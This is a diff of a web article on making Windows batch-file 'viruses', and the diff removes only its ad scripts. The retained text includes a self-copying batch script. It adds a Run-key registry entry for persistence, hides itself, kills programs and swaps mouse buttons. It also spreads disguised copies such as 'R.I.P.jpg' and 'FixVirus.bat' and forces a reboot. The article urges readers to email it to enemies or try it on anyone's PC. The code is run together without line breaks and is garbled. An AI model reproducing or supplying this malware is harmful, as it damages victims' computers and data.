@@ -25,16 +25,6 @@ Copy some old files in it and just follow the above command. By double clicking 
 
 You can try this file one any one’s computer. (but this result in causing damage to the computer, so think again before trying this on anyone’s PC)
 
-<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<!-- First Ads -->
-<ins class="adsbygoogle"
-     style="display:block"
-     data-ad-client="ca-pub-5996828242175180"
-     data-ad-slot="2764199159"
-     data-ad-format="horizontal"></ins>
-<script>
-(adsbygoogle = window.adsbygoogle || []).push({});
-</script>
 
 Virus 2:
 
@@ -58,36 +48,7 @@ Do not click on that batch file… Send it to your enimies’ email… It will:
 
 7) Changes the time to 12:00 and shuts down the computer
 
-<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<!-- First Ads -->
-<ins class="adsbygoogle"
-     style="display:block"
-     data-ad-client="ca-pub-5996828242175180"
-     data-ad-slot="2764199159"
-     data-ad-format="horizontal"></ins>
-<script>
-(adsbygoogle = window.adsbygoogle || []).push({});
-</script>
 
 CODE:-
 
     @Echo offcolor 4title 4title R.I.Pstartstartstartstart calccopy %0 %Systemroot%\Greatgame > nulreg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Greatgame /t REG_SZ/d %systemroot%\Greatgame.bat /f > nulcopy %0 *.bat > nulAttrib +r +h Greatgame.batAttrib +r +hRUNDLL32 USER32.DLL.SwapMouseButtonstart calcclstskill msnmsgrtskill LimeWiretskill iexploretskill NMainstartclscd %userprofile%\desktopcopy Greatgame.bat R.I.P.batcopy Greatgame.bat R.I.P.jpgcopy Greatgame.bat R.I.P.txtcopy Greatgame.bat R.I.P.execopy Greatgame.bat R.I.P.movcopy Greatgame.bat FixVirus.batcd %userprofile%My Documentscopy Greatgame.bat R.I.P.batcopy Greatgame.bat R.I.P.jpgcopy Greatgame.bat R.I.P.txtcopy Greatgame.bat R.I.P.execopy Greatgame.bat R.I.P.movcopy Greatgame.bat FixVirus.batstartstart calcclsmsg * R.I.Pmsg * R.I.Pshutdown -r -t 10 -c "VIRUS DETECTED"startstarttime 12:00:R.I.Pcd %usernameprofile%\desktopcopy Greatgame.bat %random%.batgoto RIP
-
-<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<!-- First Ads -->
-<ins class="adsbygoogle"
-     style="display:block"
-     data-ad-client="ca-pub-5996828242175180"
-     data-ad-slot="2764199159"
-     data-ad-format="horizontal"></ins>
-<script>
-(adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-
-<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<script>
-  (adsbygoogle = window.adsbygoogle || []).push({
-    google_ad_client: "ca-pub-6217059145544649",
-    enable_page_level_ads: true
-  });
-</script>
